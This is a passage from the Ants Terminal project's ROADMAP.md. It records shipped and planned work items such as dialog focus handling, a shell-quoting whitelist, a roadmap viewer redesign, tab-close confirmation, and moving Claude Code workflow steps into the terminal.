  `QScopeGuard`-style cleanup that fires on every synchronous
  failure path; the async dbus chain dismisses the guard and
  owns cleanup explicitly via the QProcess
  `finished`/`errorOccurred` lambdas.
  Locked by `tests/features/kwin_position_tracker/` (10 INVs:
  rename completeness + carve-out, file-rename, no-leak across
  src/CMake/packaging, env-gate placement, scope-guard ordering,
  TOCTOU preservation, no hardcoded `/tmp/kwin_pos_ants` path,
  plus behavioural drives of the env-gate bail and the
  failure-path cleanup). 121 tests pass.
  Spec: tests/features/kwin_position_tracker/spec.md.
  Two-pass cold-eyes review (0 CRITICAL on first pass; 0
  CRITICAL + 0 new HIGH on second pass).
  Kind: review-fix.
  Source: indie-review-2026-04-27.
- ✅ [ANTS-1046] **Post-fork heap allocations in flatpak detect path.**
  Shipped 2026-04-30. Detection (`getenv("FLATPAK_ID")` +
  `access("/.flatpak-info")`) and the version/directory string
  buffers all build pre-fork in the parent now. The child only
  assembles a stack-allocated `const char *argv[12]` table and
  calls `execvp` — no `std::string`/`std::vector` references
  remain between forkpty and the execvp call. snprintf (POSIX
  async-signal-safe per § 2.4.3) writes into the stack
  buffers. The `<string>` and `<vector>` includes were dropped
  from `ptyhandler.cpp` — they were only there for the
  retired post-fork path. Verified by the existing
  `flatpak_host_shell` feature test (extended to accept either
  the string-concat or snprintf-format form of the env-arg
  literals; the spec intent — "ANTS_VERSION must propagate
  via the version arg" — is unchanged).
  Kind: review-fix.
  Source: indie-review-2026-04-27.
- ✅ [ANTS-1047] **`shellutils.h` denylist regex incomplete.** Shipped
  0.7.57 — `shellutils.h:13` switched to whitelist
  `[A-Za-z0-9_\-./:@%+,]+`; `*`/`?`/`<`/`>`/`[`/`]` now force
  quoting. Locked in by `tests/features/shellutils_whitelist/`.
  Kind: review-fix.
  Source: indie-review-2026-04-27.
- ✅ [ANTS-1048] **Reuse-before-rewrite: `claudeChildrenOf(pid)`.** Shipped
  0.7.57 — extracted to `ClaudeIntegration::findClaudeChildPid`
  (`claudeintegration.cpp:113`). Both `pollClaudeProcess` and
  `ClaudeTabTracker::detectClaudeChild` now call the shared
  helper; `detectClaudeChild` also gains the `/proc` fallback
  it previously lacked.
  Kind: review-fix.
  Source: indie-review-2026-04-27.
- 📋 [ANTS-1049] **Audit-pipeline `populateChecks`-as-data-table.**
  Subsumed by ANTS-1044 (`auditdialog.cpp` decomposition above) —
  same scope: `auditcatalogue.cpp` data table +
  `packaging/check-*.sh` shell-fragment extraction. Entry preserved
  per `docs/standards/roadmap-format.md` § 3.5.1 (stable-ID
  immutability); tracked under ANTS-1044's structural lane.

The 2026-04-27 review followed the same methodology as the 0.7.12
sweep — no roadmap-internal short-cuts, every finding cites
file:line, every cross-cutting theme has ≥2 lanes flagging it.
Folded as standing practice: re-run `/indie-review` before each
minor tag (next: pre-0.8.0).
  Kind: review-fix.

### 🐛 Regressions + UX gaps reported post-0.7.55 (user, 2026-04-28)

- ✅ [ANTS-1050] **Auto-return focus to terminal when any dialog closes.**
  Shipped 2026-04-30. The existing `qApp->installEventFilter(this)`
  in MainWindow's ctor (line 364) was extended with a Close-event
  branch in `MainWindow::eventFilter`: when
  `dialogfocus::shouldRefocusOnDialogClose(watched, event)` returns
  true, a `QTimer::singleShot(0, ...)` schedules
  `focusedTerminal()->setFocus(Qt::OtherFocusReason)`. The helper
  (in `src/dialogfocus.h` as a free function so the test can drive
  it without linking the full MainWindow) returns true iff the
  event is a `QEvent::Close`, the watched object is a
  `QDialog`-derived widget, AND no other QDialog is still visible
  (stacked-dialog case suppressed). Null-guarded inside the
  deferred lambda to defend against early-startup dialogs (e.g.
  config-load failure) that close before any terminal exists.
  Locked by `tests/features/dialog_close_focus_return/spec.md` —
  9 INVs across pure-helper drives (positive case, non-QDialog,
  stacked-dialog, non-Close events, defensive nulls) plus
  source-grep guards (qApp filter installation, deferred dispatch,
  focusedTerminal() invocation, null-guard pattern, Close-event
  branch). Two cold-eyes passes (3 HIGH + 3 MEDIUM + 4 LOW
  on first pass, all folded; PASS + 3 LOW polish on second pass,
  folded inline).
  Kind: fix.
  Source: regression.
- ✅ [ANTS-1051] **Modal-style "behind the dialog is inert" semantics under the
  KDE/KWin/Wayland constraint.** Shipped 2026-04-30. Implemented
  via the existing qApp eventFilter (already installed in
  ANTS-1050) plus a new pure-logic helper
  `dialogfocus::shouldSuppressEventForDialog(watched, event)`.
  When ANY QDialog is visible and a `MouseButtonPress`,
  `MouseButtonRelease`, `MouseButtonDblClick`, `Wheel`,
  `KeyPress`, or `KeyRelease` event lands outside every visible
  dialog's tree, the eventFilter returns `true` to swallow it.
  `KeyRelease` paired with `KeyPress` prevents Qt modifier-state
  desync; the strict-ancestor edge case (Qt's `isAncestorOf` is
  strict — a widget is not its own ancestor) is handled
  explicitly so clicks on the dialog's own frame pass through.
  Stacked-dialog handling falls out of the iteration: with two
  visible dialogs A and B, clicks on either A or B (or their
  descendants) are allowed; clicks elsewhere are blocked. The
  helper is mutually exclusive on event type with
  `shouldRefocusOnDialogClose` (one fires on Close, the other
  on mouse/key) so dispatch order in the eventFilter is
  immaterial.
  Locked by `tests/features/dialog_pseudo_modal/` — 8 INV
  groups across pure-helper drives (positive case for all six
  suppressed event types, dialog-itself negation,
  child-of-dialog negation, no-dialog negation, non-mouse/key
  negation including Close (cross-INV with ANTS-1050), stacked
  dialogs, defensive nulls) plus source-grep guards (eventFilter
  swallow path, shared-with-1050 contract).
  Spec: tests/features/dialog_pseudo_modal/spec.md. Two-pass
  cold-eyes review (3 HIGH + 3 MEDIUM + 4 LOW on first pass,
  all folded; PASS + 1 MEDIUM on second pass, folded inline).
  Lanes: MainWindow, dialogfocus.
  Kind: fix.
  Source: regression.
- 📋 [ANTS-1052] **HIGH — Background-tasks status-bar button regressed:
  no longer shows up.** User report 2026-04-28. Locked-in invariant
  from 0.7.32+ (`tests/features/claude_bg_tasks_button/`) is
  passing in CI but the button is missing in the running
  binary. Likely culprits in order of probability: (a) 0.7.49
  Public/Private badge placement reshuffled status-bar widget
  insertion order and the button was demoted past the
  `addStretch()` boundary so it gets clipped; (b) `refreshBgTasksButton`
  early-return added in 0.7.54's liveness-sweep split now hides
  the button when `tasks.isEmpty()` instead of just disabling it,
  but the empty-state should still show as a 0-count chip;
  (c) per-tab scoping introduced in 0.7.32 evaluates the active
  tab's `shellCwd()` to nothing when the user is in a non-Claude
  shell, hiding the button — but it should *still* show when
  Claude is active in any tab. Triage path:
  `git log --oneline -- src/mainwindow.cpp | head -20` plus
  visual diff of `setupStatusBar` between 0.7.39 (last known
  good) and HEAD. Spec extension: extend
  `tests/features/claude_bg_tasks_button/` with a runtime
  visibility assertion (`m_claudeBgTasks->isVisible()` after a
  synthetic claude-session detect) so the next regression catches
  itself. Lanes: MainWindow, ClaudeBgTasks, ClaudeIntegration.
  Kind: fix.
  Source: user-2026-04-28.
- 📋 [ANTS-1053] **HIGH — Per-tab Background-tasks button scoping.** User
  ask: "[Background Tasks button] should be specific to the tab
  / Claude Code session it is on." Today `ClaudeBgTasks` is a
  single MainWindow-wide model surfacing every running
  `claude` PID across every tab. Fix: shift to per-tab —
  `ClaudeBgTasks` becomes a tab-attached helper (one per
  `TerminalTab`, similar to how `ClaudeIntegration::m_planModeByPid`
  caches per-PID), the status-bar button reads from the active
  tab's helper via `refreshStatusBarForActiveTab`. Discovery
  walks only the active tab's `shellPid()` subtree (lazy probe
  on tick), not every claude-rooted PID system-wide. Storage:
  the helper itself is light enough to live as a
  `std::unique_ptr<ClaudeBgTasks>` member on each tab; cleanup
  follows the tab's lifecycle. Spec extension: add INV asserting
  per-tab instance allocation + active-tab readout. Lanes:
  ClaudeBgTasks, MainWindow, TerminalTab.
  Kind: fix.
  Source: regression.
- ✅ [ANTS-1054] **MEDIUM — Mystery flashing dialog in centre of terminal.**
  User report: "now and then there is a small dialog box that
  flashes in the centre of the terminal. It is too quick to see
  what it is." 2026-04-30 update — user shared a screenshot. The
  popup's window title reads `pyte…qapp` (truncated KWin title),
  which doesn't match any Ants window-title literal — suggests the
  source may be a child process (e.g. a `pytest-qt` test session
  in another tab) rather than Ants itself. Cannot confirm without
  trace. **Step (a) shipped 0.7.57** —
  `ANTS_TRACE_DIALOGS=1` env var → installs
  `DialogShowTracer` on the `QApplication`-level event filter,
  logs every top-level `QWidget` / `QDialog` `Show` event with
  className, objectName, windowTitle, parent class+objectName,
  geometry. Output goes to stderr always (and the `events`
  category of `~/.local/share/ants-terminal/debug.log` when
  `ANTS_DEBUG=events` is also set). **Step (b) shipped 0.7.58** —
  runtime menu toggle for the tracer (commit `64e67e7`,
  CHANGELOG.md:32-55), so the user can flip the trace on
  without restarting Ants. **Steps (c-d) still pending**:
  user runs Ants with `ANTS_TRACE_DIALOGS=1` (or via the menu
  toggle) for a session, waits for a flash, reads the captured
  line. If the trace fires → log identifies the spawn site →
  fix. If the trace stays silent → confirms the popup is from a
  child process, not Ants. **Closed 2026-04-30 (user
  confirmation):** another Claude Code session resolved the
  flashing dialogs by adding a YML configuration file (the
  exact file is local to the user's environment; Ants source
  has no related change). The trace tooling stays in place for
  future incidents.
  Lanes: MainWindow plus whichever dialog-spawn site was
  identified.
  Kind: fix.
  Source: regression.

### 🔍 CI fold-in (2026-04-28)

- ✅ [ANTS-1099] **Unescaped `&` in 0.7.55 metainfo `<release>` body
  broke `appstreamcli validate`.** CI's "Validate AppStream metainfo"
  step has been red on every commit since the 0.7.55 release
  (`packaging/linux/org.ants.Terminal.metainfo.xml:116` —
  `Now returns const &.`). Fix: escape as `&amp;`. Other `&` in the
  file are already correctly escaped. Same form not present in
  `CHANGELOG.md` or `packaging/debian/changelog` (those aren't
  XML and don't pass through validators). Root cause: the 0.7.55
  release-note authoring overlooked one bare `&` when describing
  a `const &` return-type change. Future-proof: pre-commit hook
  should run `appstreamcli validate` on changes touching
  metainfo.xml — separate item, not in this fold. Kind: doc-fix.
  Source: regression. Lanes: packaging.

### 🎨 Roadmap viewer — enhancement bundle + format standard (user request 2026-04-28)

- ✅ [ANTS-1055] **Public ROADMAP.md format standard + four-doc
  shareable standards bundle.** Shipped 2026-04-28. Original ask:
  "come up with a standard for roadmap.md that we can share with
  Claude Code sessions to ensure that the roadmap is written in
  that format for this terminal to show it off better and in a
  more developer friendly manner." Scope expanded mid-flight from
  one document into four parallel standards
  (`docs/standards/{coding,documentation,testing,commits}.md`)
  plus an index (`docs/standards/README.md`). The ROADMAP format
  spec is folded into `documentation.md § 3` (covering header
  marker `<!-- ants-roadmap-format: 1 -->`, heading hierarchy,
  status/theme emojis, stable IDs in `[PROJ-NNNN]` form,
  insertion-order rules, Kind/Source metadata, current-work
  signaling, fold-in conventions). Sibling Kind/Source coverage
  added across multiple iterations: implement / fix / audit-fix /
  review-fix / doc / doc-fix / refactor / test / chore / release;

- ✅ [ANTS-1105] **Retire deprecated top-level `STANDARDS.md` and
  `RULES.md`.** Shipped 2026-04-30 (user authorised the destructive
  removal). `git rm` of both files; live references updated in
  `CONTRIBUTING.md`, `PLUGINS.md`, `README.md` (project-structure
  tree + Claude review handoff prose), `docs/RECOMMENDED_ROUTINES.md`,
  and `src/auditdialog.cpp` (the "Review with Claude" header now
  prepends the four `docs/standards/` files instead of the retired
  STANDARDS.md / RULES.md). The audit dialog's
  `appendDocIfPresent` no-ops on missing files so the runtime is
  fail-safe even where references slipped past this commit.
  CHANGELOG references to the retired files are historical and
  stay unchanged. Kind: doc-fix.

- ✅ [ANTS-1104] **Sync `docs/standards/` to the App-Build suite
  template.** Shipped 2026-04-30. The four-doc bundle was
  forked into the user-level template at
  `~/.claude/skills/app-workflow/templates/docs/standards/` for
  `/start-app` to scaffold; the template was then refined
  (idiom examples delegated to global `~/.claude/CLAUDE.md § 5`,
  push policy delegated to global § 6, ROADMAP/CHANGELOG format
  spec extracted into a separate `roadmap-format.md` sub-spec
  for token efficiency, `---` horizontal-rule separators removed
  for diff-friendliness, §3.2 numbering gap closed, project-
  agnostic `PROJ-NNNN` placeholder restored). This item brings
  the project's own `docs/standards/` back in line with the
  refined template — the four core standards plus the new
  `roadmap-format.md` sub-spec are now byte-identical to the
  template, so future `/start-app` scaffolds and this project
  share one source of truth. README.md, ROADMAP.md masthead, and
  the CHANGELOG `[Unreleased]` block updated to point at the
  new sub-spec. Kind: doc-fix. Source: user-2026-04-30. Lanes:

- [ANTS-1056] **Retired: superseded by ANTS-1100.** Per
  [ADR-0002](docs/decisions/0002-cold-eyes-companion-cleanup.md)
  decision 6: ANTS-1100 (faceted tabs + search + larger
  window — shipped 0.7.59) covers candidate additions (1) status
  filter pill counts (delivered as the search predicate), (2)
  inline search box (delivered), and (5) "currently tackled"
  override (already lives via the auto-detection — manual pin not
  pursued). The remaining additive items — (3) copy permalink, (4)
  theme overview filter, (6) export-as-Markdown — only land if the
  user explicitly asks for them; this bullet is not auto-promoted.
  ID preserved per `docs/standards/roadmap-format.md` § 3.5.1
  (stable-ID immutability); body annotated, status emoji removed.
  Kind: doc-fix. Source: ADR-0002-2026-04-30.

- ✅ [ANTS-1100] **Roadmap dialog redesign — faceted tabs +
  search + larger window.** Shipped 2026-04-30 (0.7.59). User request 2026-04-30 (refines the
  earlier 2026-04-28 ask). Three coordinated changes to the
  `RoadmapDialog`:

  1. **Tab strip** above the TOC, five faceted views over the
     existing parser output (no parser change — pure presentation
     layer):

     | Tab | What it shows | Sort order |
     |-----|---------------|------------|
     | **Full roadmap** | Everything (✅ + 🚧 + 📋 + 💭 + ★) — today's default view | Document order (per roadmap-format.md § 3.5.2) |
     | **History** | ✅ only — what's shipped | Descending chronological (latest release first) |
     | **Current** | 🚧 + ★ — bullets flagged 🚧 OR matching the [Unreleased] / last-5-commit signal (per roadmap-format.md § 3.6) | Document order |
     | **Next** | 📋 only — the work queue | Ascending document order (top of file = highest priority) |
     | **Far Future** | 💭 only — research-phase / nice-to-haves | Document order |

     Existing five filter checkboxes stay — toggling one switches
     to a "Custom" implicit tab (de-emphasised) so the user can
     fine-tune. Token efficiency: zero LLM round-trips — the
     filter bitmask + sort-order + search predicate are all
     evaluated in C++ over the already-parsed bullet list.

  2. **Search field** above the TOC. Case-insensitive substring
     filter applied across bullet headlines + bodies + IDs,
     scoped to the active tab's filter. Live update via
     `QLineEdit::textChanged` → re-render. Should also accept
     `id:1042` shorthand to jump to a specific ID. Debounced at
     ~120 ms so typing doesn't thrash the renderer.

  3. **Larger default size.** Bump from current `resize(800,
     600)` (or wherever it lands) to roughly `resize(1200, 800)`
     with `setSizeGripEnabled(true)` retained. Persist user
     resize via `Config::roadmapDialogGeometry` (saveGeometry /
     restoreGeometry round-trip — same shape as the audit dialog
     already uses).

  Implementation sketch — `roadmapdialog.cpp`/`.h`:
  - `enum class Preset { Full, History, Current, Next, FarFuture, Custom };`
  - `static unsigned filterFor(Preset p);` + new
    `static SortOrder sortFor(Preset p);` (Document /
    DescendingChronological / AscendingDocument).
  - `QTabBar *m_tabs;` placed above `m_filterDone` row.
  - `QLineEdit *m_searchBox;` with debounced timer; passes a
    `QString` predicate into `renderHtml`.
  - Tab `currentChanged` → `applyPreset(p)` →
    `setFilters(filterFor(p), sortFor(p))` → `refresh()`.
  - Checkbox `toggled` → if resulting `(filter, sort)` doesn't
    match any named preset, switch the tab bar to "Custom".

  Spec / lock: new `tests/features/roadmap_viewer_tabs/`
  (spec.md + test_*.cpp). Invariants:
  - INV-1..5: `filterFor(p)` returns the documented bitmask for
    each named preset (Full / History / Current / Next /
    FarFuture).
  - INV-6: `sortFor(History)` is `DescendingChronological`;
    other presets use `Document`.
  - INV-7: tab bar is the first widget in the dialog's vertical
    layout.
  - INV-8: Custom tab activates when the active filter+sort
    combination matches no named preset.
  - INV-9: `applyPreset(History)` rendered HTML contains only ✅
    bullets, in reverse chronological order (round-trip via the
    `renderHtml` static helper — no Qt event loop needed).
  - INV-10: search predicate `"OSC 8"` against a synthetic
    document containing two bullets — one with `OSC 8` in the
    headline, one without — yields exactly one bullet in the
    rendered HTML.
  - INV-11: search predicate `"id:1042"` jumps to the
    `[ANTS-1042]` bullet regardless of headline content.
  - INV-12: dialog default size is `≥ 1100x720`; geometry is
    saved/restored across launches via the persisted
    `roadmapDialogGeometry` key.

  Why this matters for the user's underlying ask: the dialog is
  the user's window into the project's state without spending
  Claude tokens. The tabs replicate the most common Claude-side
  questions ("what's done?" / "what's next?" / "what's in
  flight?") in zero-token UI clicks. Kind: implement. Lanes:
  RoadmapDialog, Config.

### 🎨 Claude Code template integration (user request 2026-04-28)

- 💭 [ANTS-1057] **Claude Code project-template offload.** User ask: "I am
  busy with a Claude Code template for any new project. Once I
  have fully laid it out, I want Ants Terminal to do as much of
  the work as possible so as to reduce token usage." The intent
  is to move template-instantiation work from the LLM into the
  terminal — saving the per-session token cost of asking Claude
  Code to scaffold the same files for every new project. Sketch:
  Settings → "Claude Code template" pane lets the user point at a
  template root directory; `File → New project from template…`
  spawns a wizard that prompts for the project name + target dir,
  copies the template subtree (with mustache-style `{{name}}`
  substitution on file contents and filenames), runs the
  template's `post-init.sh` if present, then opens the new
  project in a fresh tab with `claude` already invoked. Hooks
  into existing Claude-detection so the per-tab status indicator
  comes online immediately. Token savings come from the LLM
  never having to read or write the template files — they're
  baked into the template once, copied verbatim by the terminal.
  Bridges to the existing `roadmap_format` standard above: a
  template that ships `ROADMAP.md` in the v1 format gets
  immediate Roadmap-button support in any tab opened via the
  wizard. Deferred to 💭 because the template format itself
  needs to settle (the user is still iterating); revisit once
  they've shared the laid-out template. Lanes: MainWindow,
  SettingsDialog, new `ProjectTemplateWizard` class, docs.
  Kind: implement.
  Source: user-2026-04-28.

### 🎨 Undo for accidental tab close (user request 2026-04-30)

- ✅ [ANTS-1101] **Reopen-closed-tab — Ctrl+Shift+Z.** Discovered
  during ANTS-1102 implementation that the headline behaviour was
  already shipped pre-request: `m_closedTabs` deque (cap 10) plus
  a `Ctrl+Shift+Z` action ("Undo Close Tab" in the File menu) that
  pops the stack, opens a new tab, and `cd`s to the saved cwd.
  Code at `mainwindow.cpp:952-970` (action) and `performTabClose`
  (push, refactored from the original `closeTab` body during the
  ANTS-1102 helper split). v1 capacity is hardcoded at 10;
  configurable cap, title-restore, color-restore, and PTY-state
  restore (vim/claude across close) are out of scope — the
  prevention layer (ANTS-1102) covers the catastrophic-loss
  case more effectively. Original ask: "Do you think an
  Undo/Redo feature would be helpful in Ants Terminal in
  relation to closing tabs, colour changes, etc.?" Lanes:
  MainWindow.
  Kind: implement.
  Source: user-2026-04-30.

- ✅ [ANTS-1102] **Confirm-on-close for tabs running non-shell
  processes.** User-emphasised priority ("the confirm alone will
  help a lot"). Walks `/proc/<shellPid>/task/<shellPid>/children`
  transitively (cap 256 visited), comparing each descendant's
  `comm` against an 11-shell allowlist (`bash`, `zsh`, `fish`,
  `sh`, `ksh`, `dash`, `ash`, `tcsh`, `csh`, `mksh`, `yash`).
  First non-shell descendant triggers a Wayland-correct non-modal
  `QDialog` (heap, `WA_DeleteOnClose`, plain `QPushButton`s, no
  `setModal` per the 0.7.50 QTBUG-79126 lessons) naming the
  process; "Cancel" returns silently, "Close anyway" calls
  `performTabClose`, optionally with a "Don't ask again"
  checkbox flipping `Config::confirmCloseWithProcesses` to false.
  Default on. Settings → Window/Tabs surface added. Refactored
  `closeTab` into `closeTab` (probe gate) + `performTabClose`
  (teardown) so the dialog's accept handler can re-enter cleanly.
  Locked by `tests/features/confirm_close_with_processes/`
  (11 invariants — config getter/setter + storeIfChanged
  idempotency, `firstNonShellDescendant` helper shape,
  `safeShellNames` baseline, `closeTab` probe + dialog routing,
  `performTabClose` is the sole teardown + undo-push site, dialog
  uses the Wayland-correct pattern, "Don't ask again" flips the
  config, full SettingsDialog wire-up). Lanes: Config, MainWindow,
  SettingsDialog.
  Kind: implement.
  Source: user-2026-04-30.

- 💭 [ANTS-1103] **Generic UI-action undo / redo stack
  (deferred).** A wider mechanism beyond tab-close: font-size
  changes, theme-pick, layout splits, etc. Not recommended —
  Settings dialog already has Cancel/OK for everything it owns;
  the one remaining uncovered surface (tab-close) is handled by
  ANTS-1101 + ANTS-1102 with a cheap implementation. Revisit
  only if user feedback shows specific UI actions repeatedly in
  need of undo. If reopened, the design likely splits per-domain
  (tabs, themes, panes — each its own LIFO) rather than one
  global stack so `Ctrl+Z` doesn't ambiguously cross domains.
  Lanes: TBD.
  Kind: implement.
  Source: user-2026-04-30.

### 🎨 App-Build native integration (user request 2026-04-30)

> **Strategic theme.** Move as much of the App-Build per-phase
> 9-step loop into Ants Terminal natively as possible. Goal stated
> by the user: "minimise token usage" by offloading mechanical
> work from Claude Code to Ants. Triage of the 9 steps:
>
> | Step | Where it should run | Token cost |
> |------|---------------------|------------|
> | 1. Verify spec | Claude (judgment) | LLM |
> | 2. Verify deps on the DAG | Ants (graph walk over `Source:` / `Refs:`) | none |
> | 3. Write failing tests | Claude (drafting) | LLM |
> | 4. Implement until green | Claude (drafting) | LLM |
> | 5. Run `/audit` | Ants (already runs cppcheck/clazy/semgrep/etc. natively in `auditdialog`) | none |
> | 6. Run `/indie-review` | Claude (judgment) | LLM |
> | 7. Fold actionable findings → new FP## item | Ants (atomic file edit + counter increment) | none |
> | 8. Update CHANGELOG / ROADMAP / journal | Mostly Ants (status flips, dated section creation, file moves); Claude only for the prose body | partial |
> | 9. Commit, tag, push | Ants (`git` shell-out + `gh release create` for the GitHub-attached body) | none |
>
> Steps 2, 5, 7, parts of 8, and 9 are mechanical — they collapse
> from "ask Claude to run the tool, paste the output, ask Claude
> to triage, ask Claude to update the file" into one button
> click. That's the win.

- 📋 [ANTS-1106] **Mandatory `Kind:` field + viewer faceted
  categorisation.** Stable IDs stay monotonic (`[ANTS-NNNN]`
  with one counter at `.roadmap-counter`) — kind-prefixed IDs
  considered and rejected (per-type counters fragment atomic
  allocation; reclassifying a bullet's Kind would either renumber
  it (breaks links) or create prefix/Kind mismatch). Instead, the
  cleaner win is making the existing optional `Kind:` field
  **required**: every bullet declares `Kind: implement|fix|
  audit-fix|review-fix|doc|doc-fix|refactor|test|chore|release`.
  The roadmap dialog adds a secondary faceted strip under the
  ANTS-1100 tabs that lets the user filter by Kind (one or more
  checked at a time), with per-Kind colour cues so an audit-fix
  visually pops vs an `implement`. Backfill pass: scan every
  existing bullet, infer `Kind:` from section heading + body, add
  the line. Update `roadmap-format.md § 3.5.3` so the field is
  documented as required (currently "MAY be omitted") and pull
  the same change through to
  `~/.claude/skills/app-workflow/templates/docs/standards/roadmap-format.md`
  so the App-Build template stays aligned. Token efficiency: the
  Kind facet is the structured tag the dialog needs to do the
  user's "what kinds of work are queued?" query without an LLM
  round-trip. Kind: doc-fix. Source: user-2026-04-30. Lanes: docs,
  RoadmapDialog.

- 📋 [ANTS-1107] **Adopt App-Build documentation folder
  structure.** The user-level `/start-app` template ships a
  richer `docs/` tree than this project currently has. Bring
  Ants Terminal in line:

  | File / dir | Purpose | Action |
  |------------|---------|--------|
  | `docs/standards/` | Shareable v1 standards bundle | ✅ done in ANTS-1104 |
  | `docs/decisions/` | ADRs (Michael Nygard) | ✅ scaffolded in ANTS-1055 |
  | `docs/specs/` | Per-feature spec drafts | ✅ scaffolded |
  | `docs/journal/` | Per-phase outcomes / session notes | ✅ scaffolded (currently empty) |
  | `docs/glossary.md` | Project terminology (VT actions, OSC numbers, MCP, IPC, etc.) | 📋 create — pull from CLAUDE.md module map and PLUGINS.md |
  | `docs/known-issues.md` | Deferred bugs / upstream-blocked items / platform-specific quirks | 📋 create — start with QTBUG-79126, KWin maximize-restore, etc. |
  | `docs/audit-allowlist.md` | Confirmed false positives the audit pipeline skips | 📋 create — current allowlist lives in `.audit_suppress` JSONL; surface human-readable rationale here |
  | `docs/ideas.md` | Far-future research / nice-to-haves | 📋 create — lift the 💭 bullets out of ROADMAP into a dedicated file |
  | `docs/discovery.md` | First-principles project framing | N/A — Ants is post-discovery; document the project's history briefly in `README.md` instead |
  | `docs/design.md` | Architecture overview | 📋 create — extract from CLAUDE.md module-map + data-flow + design-decision sections; keep CLAUDE.md as the terse Claude-facing brief |
  | `.claude/workflow.md` | Phase-tracking § 1 status header + journal § 3 | 📋 create — adapted to a post-1.0 release-driven project (no Phase A/B/C/D since discovery is decades behind us; the active surface is "current `[Unreleased]` cycle" + "next release target") |

  Use this as a forcing function to delete `STANDARDS.md` and
  `RULES.md` (per ANTS-1105) — their content was already
  duplicated by `docs/standards/coding.md`. Each new file gets
  one commit. Kind: doc. Source: user-2026-04-30. Lanes: docs.

- 📋 [ANTS-1108] **Native App-Build runner inside Ants Terminal
  — the strategic token-saver.** User ask 2026-04-30:
  "incorporate the Ants App-Build suite into Ants Terminal so
  that any user using Ants Terminal can use this without a
  Claude subscription. Or at least perform as much as possible…
  the aim is to reduce token usage by off-loading as much as
  possible to Ants Terminal to perform instead of Claude Code."
  Concrete deliverables, in priority order:

  1. **Workflow panel** — new dialog, opens via `View →
     Workflow` (or status-bar button). Reads `.claude/workflow.md`
     § 1 status header; renders phase / active item / step
     progress (✅ ⬜ 🚧). Each mechanical step from the 9-step
     loop is a button:
     - **Allocate next ID** — atomic increment of
       `.roadmap-counter` under flock; copies `[ANTS-NNNN]` to
       clipboard. (Replaces "ask Claude for the next ID".)
     - **Run `/audit`** — invokes the existing `auditdialog`
       pipeline scoped to the active item's `Lanes:`. Findings
       feed the existing triage UI; folding into ROADMAP via a
       templated `### 🔍 Audit fold-in (YYYY-MM-DD)` block done
       by Ants directly (atomic file edit). (Replaces "ask Claude
       to run /audit, paste the JSON, triage, fold in".)
     - **Run tests** — `ctest --output-on-failure -L <lanes>`
       in-process; parses CTest output, renders pass/fail with
       per-test logs in a panel. (Replaces "ask Claude to run
       ctest and report".)
     - **Run drift check** — shells out to
       `packaging/check-version-drift.sh`; renders pass/fail.
     - **Run `/debt-sweep`** — native scanner: stale
       `Q_UNUSED` / `_unused` markers, ROADMAP items still 📋
       after a matching commit, packaging files still on a
       previous version, comments referring to renamed types.
       Surfaces a diff-style preview the user accepts/rejects.
       (Replaces the LLM-driven debt-sweep delegate today.)
     - **Run `/bump <version>`** — parses
       `.claude/bump.json` and applies every templated edit
       in-process via `QFile` + atomic write. (Replaces the
       Claude-driven `/bump` skill end-to-end.)
     - **Run `/release`** — orchestrates `/bump` → build →
       tests → drift → commit → tag (gated by all-green; a
       failing test stops the run with a structured error).

  2. **CHANGELOG / ROADMAP edits** — Ants writes the templated
     parts (status emoji flips, dated section creation, ID
     allocation, fold-in headings) directly. Claude is only
     invoked when the user wants prose drafted (a CHANGELOG
     bullet body, a journal entry, an ADR), at which point Ants
     opens the existing `aidialog` with a structured prompt
     pre-filled — the user's own LLM credentials, billed once,
     not per-step.

  3. **`/start-app` analogue** — `File → New project from
     App-Build template…` (extends ANTS-1057). Wizard prompts
     name + path, copies
     `~/.claude/skills/app-workflow/templates/` with
     mustache-style substitution, runs `git init` +
     scaffold-commit, opens in a fresh tab. Zero LLM round-trips.

  4. **`/indie-review` partial offload** — Ants can still run
     the lane partition + per-lane diff extraction natively;
     the actual per-lane judgment stays in Claude (or the user's
     own LLM via aidialog). This step is the only one that
     genuinely needs LLM judgment, and even there, Ants prepares
     the prompt so the user spends one LLM call per lane instead
     of N.

  5. **Per-phase completion ceremony** — flip status to ✅,
     cross-reference the commit SHA in the bullet, write the
     journal entry stub, ask the user about push. All
     mechanical, all in C++.

  Out of scope for v1: drafting prose (always Claude-shaped),
  cross-cutting refactor judgment (review needs a model), spec
  brainstorming. The contract: Ants does file IO + tool
  orchestration + parsing + atomic edits + ID allocation; Claude
  (or the user's own LLM via aidialog) does prose + judgment.

  Spec parser: reads `tests/features/*/spec.md`, extracts INV
  numbers + their assertions, can scaffold a test stub. CMake
  wiring done by a templated `add_executable + add_test` block.

  Storage: workflow state in `.claude/workflow.md` (already the
  contract); no new config keys. The dialog reads / writes that
  file directly.

  Subsumes / supersedes the narrower ANTS-1057 (Claude Code
  template offload) — that bullet stays for cross-reference but
  its scope folds entirely into ANTS-1108.

  Locked by `tests/features/workflow_runner/` (spec.md + tests
  for: ID allocator atomicity under concurrent flock,
  bump-recipe parser correctness, drift-check shell-out
  exit-code propagation, audit-finding fold-in produces a
  syntactically valid ROADMAP block matching roadmap-format.md
  § 3.5.6, debt-sweep finding categorisation matches the
  existing `/debt-sweep` skill's triage table). Kind: implement.

### 🎨 Claude Code companion offload (user request 2026-04-30)

> **Strategic theme.** Make Ants Terminal the recommended
> terminal alongside Claude Code by absorbing every
> Claude-Code-shaped workflow whose mechanical core can run
> natively. Companion to ANTS-1108 (App-Build runner). The
> three bullets below catalogue the work; ANTS-1110 is the
> overview / per-superpowers-skill triage, ANTS-1111 folds
> `/audit` triage into the Project Audit tool, ANTS-1112 lifts
> `/indie-review` orchestration so Claude is invoked only for
> the per-lane judgment + optional synthesis.

- 💭 [ANTS-1110] **Catalogue retired — re-shaped per
  [ADR-0002](docs/decisions/0002-cold-eyes-companion-cleanup.md).**
  The original 13-row "absorb every superpowers skill" table mixed
  mechanical-shape rows (e.g. `using-git-worktrees`) with judgment-
  shape rows (e.g. `verification-before-completion`,
  `brainstorming`) under one bullet. Cold-eyes review found the
  catalogue had no acceptance criteria and would burn weeks on
  rows that don't actually save tokens.
  ID preserved per `docs/standards/roadmap-format.md` § 3.5.1
  (stable-ID immutability); body trimmed; status flipped to 💭
  (research) until each future skill-absorption ships under its
  own bullet. **First candidate to promote out of 💭:**
  `using-git-worktrees` — unambiguously mechanical, single-feature
  scope. Subsequent promotions gated on ANTS-1120 measurement
  results. `verification-before-completion`, `brainstorming`,
  `frontend-design`, and the other judgment-heavy rows stay 💭
  unless / until the user explicitly pulls them in.
  Kind: research. Source: ADR-0002-2026-04-30.
  Lanes: TBD per future per-skill bullet.

